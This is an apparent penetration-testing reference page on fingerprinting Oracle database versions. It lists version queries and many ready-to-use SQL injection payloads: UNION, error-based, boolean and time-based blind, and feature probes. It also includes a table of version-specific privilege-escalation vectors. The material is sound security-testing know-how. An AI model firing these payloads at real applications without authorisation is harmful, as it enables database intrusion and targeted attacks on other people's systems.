---
title: Testing Version
description: Methods to determine the version of Oracle database
category: Basics
order: 3
tags: ["version", "enumeration", "reconnaissance"]
lastUpdated: 2026-10-08
---

Identifying the Oracle database version is a crucial first step in SQL injection testing. Different Oracle versions have different features, vulnerabilities, and syntax support, which can significantly impact your testing strategy.

## Version Information Queries

Oracle provides several ways to retrieve version information:

| Method                                                   | Description                                                 | Example Output (19c)                                                                                   |
| -------------------------------------------------------- | ----------------------------------------------------------- | ------------------------------------------------------------------------------------------------------ |
| `SELECT BANNER FROM v$version`                           | Full version string, readable by any user                   | Oracle Database 19c Enterprise Edition Release 19.0.0.0.0 - Production                                 |
| `SELECT BANNER_FULL FROM v$version`                      | Banner plus the release update (18c+)                       | Oracle Database 19c Enterprise Edition Release 19.0.0.0.0 - Production Version 19.22.0.0.0 (two lines) |
| `SELECT VERSION, VERSION_FULL FROM v$instance`           | Version numbers (`VERSION_FULL` from 18c); needs privileges | 19.0.0.0.0, 19.22.0.0.0                                                                                |
| `SELECT PRODUCT, VERSION FROM product_component_version` | Version numbers, readable by any user                       | Oracle Database 19c Enterprise Edition, 19.0.0.0.0                                                     |

Up to 12c, `v$version` returns several rows (database, PL/SQL, CORE, TNS, NLSRTL); from 18c it returns a single row. `v$instance` needs `SELECT ANY DICTIONARY` or `SELECT_CATALOG_ROLE`.

Banners by version:

| Version       | Example `BANNER`                                                                    |
| ------------- | ----------------------------------------------------------------------------------- |
| 8i            | Oracle8i Enterprise Edition Release 8.1.7.0.0 - Production                          |
| 9i            | Oracle9i Enterprise Edition Release 9.2.0.1.0 - Production                          |
| 10g           | Oracle Database 10g Enterprise Edition Release 10.2.0.4.0 - Prod                    |
| 11g           | Oracle Database 11g Enterprise Edition Release 11.2.0.4.0 - 64bit Production        |
| 12c           | Oracle Database 12c Enterprise Edition Release 12.2.0.1.0 - 64bit Production        |
| 18c, 19c, 21c | Oracle Database 19c Enterprise Edition Release 19.0.0.0.0 - Production              |
| 23ai          | Oracle Database 23ai Free Release 23.0.0.0.0 - Develop, Learn, and Run for Free     |
| 23ai (23.26+) | Oracle AI Database 26ai Free Release 23.26.3.0.0 - Develop, Learn, and Run for Free |

The 23.2 and 23.3 developer releases still said `23c` (renamed 23ai in May 2024), and Oracle AI Database 26ai is the 23ai code line renamed again: the version number stays `23` (`v$instance.VERSION` is `23.0.0.0.0`), so test for `23` rather than `26`.

## Basic Version Queries

```sql
-- Most common method
SELECT BANNER FROM v$version WHERE ROWNUM=1

-- Version number, readable by any user
SELECT VERSION FROM product_component_version WHERE ROWNUM=1

-- Version numbers from v$instance (VERSION_FULL and VERSION_LEGACY from 18c)
SELECT VERSION, VERSION_FULL, VERSION_LEGACY FROM v$instance
```

## Component Version Information

```sql
-- Banners of installed components, readable by any user
SELECT BANNER FROM all_registry_banners

-- Installed components and versions (needs DBA privileges)
SELECT COMP_ID, COMP_NAME, VERSION FROM dba_registry

-- Get feature usage info (needs DBA privileges)
SELECT NAME, VERSION, DETECTED_USAGES FROM dba_feature_usage_statistics
```

## SQL Injection Examples

### UNION-Based Version Detection

```sql
-- Two-column string query
' UNION SELECT BANNER,NULL FROM v$version WHERE ROWNUM=1--

-- Four-column string query
' UNION SELECT NULL,BANNER,NULL,NULL FROM v$version--
```

### Error-Based Version Detection

These work when the application displays database errors. `OR` makes Oracle evaluate the function even though `username = ''` matches no row:

```sql
-- Oracle Text installed (CTXSYS): DRG-11701: thesaurus <banner> does not exist
' OR CTXSYS.DRITHSX.SN(1,(SELECT BANNER FROM v$version WHERE ROWNUM=1))=1--

-- Oracle 23ai+ with ERROR_MESSAGE_DETAILS=ON (the default): ORA-01722 is followed by ORA-03302 ... invalid string value: <banner>
' OR 1=TO_NUMBER((SELECT BANNER FROM v$version WHERE ROWNUM=1))--
```

### Blind Version Detection

For blind SQL injection, the injected value must make the original condition true (here `admin`), otherwise the result is always empty:

```sql
-- Check if first character of the banner is 'O'
admin' AND ASCII(SUBSTR((SELECT BANNER FROM v$version WHERE ROWNUM=1),1,1))=79--

-- Check the major version directly
admin' AND (SELECT VERSION FROM product_component_version WHERE ROWNUM=1) LIKE '19.%'--
```

For time-based blind (`DBMS_PIPE` needs an explicit grant, see [Timing](/oracle/timing)):

```sql
-- Add delay if first character is 'O'
admin' AND (CASE WHEN ASCII(SUBSTR((SELECT BANNER FROM v$version WHERE ROWNUM=1),1,1))=79 THEN DBMS_PIPE.RECEIVE_MESSAGE('x',10) ELSE 0 END)>=0--
```

## Version-Specific Testing

Matching the banner identifies the release; the version number avoids the differences between banner formats:

```sql
-- Banner contains the release name ('8i', '9i', '10g', '11g', '12c', '18c', '19c', '21c', '23c', '23ai', '26ai')
admin' AND (SELECT COUNT(*) FROM v$version WHERE BANNER LIKE '%11g%')>0--

-- Major version number (8, 9, 10, 11, 12, 18, 19, 21, 23)
admin' AND (SELECT VERSION FROM product_component_version WHERE ROWNUM=1) LIKE '12.%'--
```

When `v$version` is not reachable, a feature that only exists from a given version gives the same answer: the payload succeeds on that version and later, and fails with an error on earlier ones:

| Feature test                                         | Minimum version |
| ---------------------------------------------------- | --------------- |
| `LISTAGG(...) WITHIN GROUP (ORDER BY ...)`           | 11g R2          |
| `SYS_CONTEXT('USERENV','CON_NAME')` (multitenant)    | 12c             |
| `BANNER_FULL` column of `v$version`                  | 18c             |
| `TRUE` boolean literal, `SELECT` without `FROM dual` | 23ai            |

```sql
-- 12c or later (ORA-02003 on 11g)
admin' AND SYS_CONTEXT('USERENV','CON_NAME') IS NOT NULL--

-- 18c or later (ORA-00904 on 12c)
admin' AND (SELECT BANNER_FULL FROM v$version WHERE ROWNUM=1) IS NOT NULL--

-- 23ai or later (fails on 21c and earlier: ORA-00920 in a WHERE clause, ORA-00900 in some other contexts)
admin' AND TRUE--
```

## Oracle Edition Detection

The banner also names the edition: `Enterprise Edition`, `Standard Edition` (`Standard Edition 2` from 12.1.0.2), `Express Edition` (XE, up to 21c) or `Free` (23ai):

```sql
-- Checking for Enterprise Edition
admin' AND (SELECT COUNT(*) FROM v$version WHERE BANNER LIKE '%Enterprise%')>0--

-- Checking for Express Edition
admin' AND (SELECT COUNT(*) FROM v$version WHERE BANNER LIKE '%Express%')>0--
```

## PL/SQL Version Detection

Up to 12c, `v$version` has a separate PL/SQL row; from 18c the PL/SQL version is the database version:

```sql
-- Get PL/SQL version (12c and earlier)
' UNION SELECT BANNER,NULL FROM v$version WHERE BANNER LIKE 'PL/SQL%'--
```

## Installed Components

`ALL_REGISTRY_BANNERS` lists installed components such as Oracle Text, XML DB or APEX for any user; `DBA_REGISTRY` gives the same with IDs but needs DBA privileges:

```sql
' UNION SELECT BANNER,NULL FROM all_registry_banners--

-- With DBA privileges
' UNION SELECT comp_name,version FROM dba_registry--
```

## Practical Considerations

### Version-based Attack Planning

Once you know the version, you can plan more targeted attacks:

| Version | Potential Vectors                                                                 |
| ------- | --------------------------------------------------------------------------------- |
| 8i, 9i  | Older PL/SQL package vulnerabilities                                              |
| 10g     | PL/SQL injection, SYS.DBMS_EXPORT_EXTENSION (fixed by the 2006 CPUs)              |
| 11g     | DBMS_JVM_EXP_PERMS privilege escalation (needs Java; fixed in the April 2010 CPU) |
| 12c+    | More restrictive by default, need targeted approaches                             |
